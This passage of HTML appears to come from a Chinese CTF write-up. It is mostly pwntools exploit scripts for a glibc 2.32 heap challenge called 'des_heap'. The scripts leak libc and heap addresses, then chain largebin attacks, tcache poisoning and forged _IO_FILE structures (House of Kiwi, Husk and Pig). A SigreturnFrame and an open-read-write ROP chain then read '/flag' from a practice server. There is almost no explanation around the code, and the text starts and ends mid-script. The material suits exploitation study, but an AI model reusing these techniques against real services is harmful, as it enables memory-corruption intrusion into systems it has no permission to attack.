                |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x431</span>) + <span class="hljs-string">&#x27;\0&#x27;</span> * <span class="hljs-number">0x420</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0xf0</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x421</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x410</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x10</span><br>lg(<span class="hljs-string">&#x27;LEN&#x27;</span>,<span class="hljs-built_in">len</span>(chunk))<br>edit(<span class="hljs-number">0x1000</span>,chunk)<br><br><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x10</span>)  <span class="hljs-comment"># Largebin</span><br>add(<span class="hljs-number">0x1000</span>)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|   Largebin Attack __printf_function_table&amp;__printf_arginfo_table      |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)  <span class="hljs-comment"># Unsorted</span><br>edit(<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(__printf_function_table - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;__printf_function_table&#x27;</span>,__printf_function_table)<br><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(__printf_arginfo_table - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;__printf_function_table&#x27;</span>,__printf_arginfo_table)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x398</span>,p64(exit))<span class="hljs-comment"># Exit</span><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                      Largebin Attack _IO_list_all                     |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(_IO_list_all - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>,_IO_list_all)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|        Largebin Attack main_arena&#x27;s topchunk,Kiwi Preparing.....      |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(top_chunk - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>,_IO_list_all)<br><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|        Tcache Poisoning,Make up _IO_FILE chain,Pig Preparing.....     |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>edit(<span class="hljs-number">0x110</span>,p64(heap_leak^(__malloc_hook)),<span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x50</span>,<span class="hljs-number">0x58</span>)<br>edit(<span class="hljs-number">0</span> + <span class="hljs-number">0x60</span> + <span class="hljs-number">0x10</span>,p64(magic) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x50</span>,<span class="hljs-number">0x58</span>)<br><br>fuck = SigreturnFrame()<br>fuck.rsp = heap_base + <span class="hljs-number">0xD10</span><br>fuck.rip = ret<br><br>orw = flat([<br>    rax,<span class="hljs-number">2</span>,rdi,heap_base + <span class="hljs-number">0xD00</span>,rsi,<span class="hljs-number">0</span>,syscall_ret,rdi,<span class="hljs-number">4</span>,rdx_r12,<span class="hljs-number">0x100</span>,<span class="hljs-number">0</span>,rsi,heap_base + <span class="hljs-number">0x10</span>,read_addr,rdi,<span class="hljs-number">1</span>,write_addr<br>])<br>edit(<span class="hljs-number">0</span> + <span class="hljs-number">0xA00</span> ,fuck,<span class="hljs-number">0x300</span>)<br>edit(<span class="hljs-number">0</span> + <span class="hljs-number">0xD00</span>,<span class="hljs-string">&#x27;/flag\0&#x27;</span>,<span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">0</span> + <span class="hljs-number">0xD10</span>,orw,<span class="hljs-number">0x100</span>)<br><br>                             <span class="hljs-comment"># write_ptr</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>) +p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#rdx</span><br>payload += p64(heap_base + <span class="hljs-number">0x10</span>)+p64(heap_base + <span class="hljs-number">0x10</span> + <span class="hljs-number">70</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <span class="hljs-comment"># buf_base,buf_end </span><br>payload += p64(heap_base + <span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">8</span> <span class="hljs-comment"># _chain</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">48</span><br>payload += p64(_IO_str_jumps)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span>,payload)<br><br>                             <span class="hljs-comment"># write_ptr</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>) +p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#rdx</span><br>payload += p64(heap_base + <span class="hljs-number">0x60</span> + <span class="hljs-number">0x10</span>)+p64(heap_base + <span class="hljs-number">0x60</span> + <span class="hljs-number">0x10</span> + <span class="hljs-number">70</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <span class="hljs-comment"># buf_base,buf_end </span><br>payload += p64(heap_base + <span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span> + <span class="hljs-number">0x200</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">8</span> <span class="hljs-comment"># _chain</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">48</span><br>payload += p64(_IO_str_jumps)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span>,payload)<br><br><span class="hljs-comment"># ORW                             # rdx</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0</span>) + p64(heap_base + <span class="hljs-number">0xA00</span>) +p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#rdx</span><br>payload += p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <span class="hljs-comment"># buf_base,buf_end </span><br>payload += p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">8</span> <span class="hljs-comment"># _chain</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">48</span><br>payload += p64(_IO_str_jumps)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span> + <span class="hljs-number">0x200</span>,payload)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                   Trigger Kiwi --&gt; Husk --&gt; Pig                       |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>add(<span class="hljs-number">0x1000</span>)<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>å¦é™„ shellcode ç‰ˆæœ¬ï¼ˆé¿å…é˜´é—´å‡ºé¢˜äººæ²™ç›’æ‹‰æ»¡ï¼Œ<strong>ä¾§ä¿¡é“ï¼Œæ¶æ„åå¤æ¨ªè·³</strong>ï¼Œæˆ–è€…<strong>æŠŠ flag è—èµ·æ¥</strong>ï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.32/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./des_heap&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br><span class="hljs-comment"># p = process(&#x27;./des_heap&#x27;)</span><br><span class="hljs-comment"># debug()</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25296</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(choice))<br>    sleep(<span class="hljs-number">0.03</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">offset,data,size=<span class="hljs-number">0x1000</span>-<span class="hljs-number">1</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;offset: &#x27;</span>,<span class="hljs-built_in">str</span>(offset))<br>    sla(<span class="hljs-string">&#x27;content: &#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&#x27;idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    menu(<span class="hljs-number">4</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                               Init Heap                               |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span> <br>add(<span class="hljs-number">0x100</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                 0x100*8 ---&gt; Full Tcache ,Leak libc                   |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span> <br>chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0xf0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    chunk += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0xf0</span><br>edit(<span class="hljs-number">0</span>,chunk)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span> + (<span class="hljs-number">7</span>-i)*<span class="hljs-number">0x100</span>)<br>dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">0xf8</span>)<br>dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span>)<br><br><span class="hljs-comment"># Bypass \x00 Leak libc</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x11</span>,<span class="hljs-number">0x11</span>) <br>show()<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x1e0c75</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>libc = elf.libc<br>libc.address = libc_base<br>rax = libc_base + <span class="hljs-number">0x0000000000044c70</span><br>rdi = libc_base + <span class="hljs-number">0x0000000000028a55</span><br>rsi = libc_base + <span class="hljs-number">0x000000000002a4cf</span><br>rdx_r12 = libc_base + <span class="hljs-number">0x0000000000112a51</span><br>syscall_ret = libc_base + <span class="hljs-number">0x000000000006105a</span><br>ret = libc_base + <span class="hljs-number">0x0000000000028a55</span> + <span class="hljs-number">1</span><br>read_addr = libc.sym.read<br>write_addr = libc.sym.write<br>__malloc_hook = libc.sym.__malloc_hook<br>__free_hook = libc.sym.__free_hook<br>system_addr = libc.sym.system<br>jmp_rsi = libc_base + <span class="hljs-number">0x00000000000756fd</span><br><span class="hljs-comment"># 0x00000000000756fd: mov r13d, 1; jmp rsi;</span><br><span class="hljs-comment"># bin_sh%1 == 1</span><br><span class="hljs-comment"># bin_sh = libc.search(&#x27;/bin/sh&#x27;).next() </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Husk</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>__printf_function_table = libc_base + <span class="hljs-number">0x1e35c8</span><br>__printf_arginfo_table = libc_base + <span class="hljs-number">0x1eb218</span><br>exit = libc.sym.exit<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Pig</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>_IO_list_all = libc_base + <span class="hljs-number">0x1e15c0</span><br>_IO_str_jumps = libc_base + <span class="hljs-number">0x1e2560</span><br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Kiwi</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>top_chunk = libc_base + <span class="hljs-number">0x1e0c00</span><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                        Leak Heap,Recover Heap                         |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x101</span>)+<span class="hljs-string">&#x27;\x00&#x27;</span>,<span class="hljs-number">0x11</span>) <br>add(<span class="hljs-number">0x58</span>)<br>dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span>)<br>show()<br>ru(<span class="hljs-string">&#x27;content: &#x27;</span>)<br>heap_leak = uu64(rc(<span class="hljs-number">4</span>))<br>heap_base = heap_leak &lt;&lt; <span class="hljs-number">12</span><br>lg(<span class="hljs-string">&#x27;heap_leak&#x27;</span>,heap_leak)<br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br>add(<span class="hljs-number">0x98</span>) <span class="hljs-comment"># 0xa0 + 0x60 = 0x100 Recover Heap</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                   Largebin Attack Preparing.....                      |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x431</span>) + <span class="hljs-string">&#x27;\0&#x27;</span> * <span class="hljs-number">0x420</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0xf0</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x421</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x410</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x10</span><br>lg(<span class="hljs-string">&#x27;LEN&#x27;</span>,<span class="hljs-built_in">len</span>(chunk))<br>edit(<span class="hljs-number">0x1000</span>,chunk)<br><br><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x10</span>)  <span class="hljs-comment"># Largebin</span><br>add(<span class="hljs-number">0x1000</span>)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|   Largebin Attack __printf_function_table&amp;__printf_arginfo_table      |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + 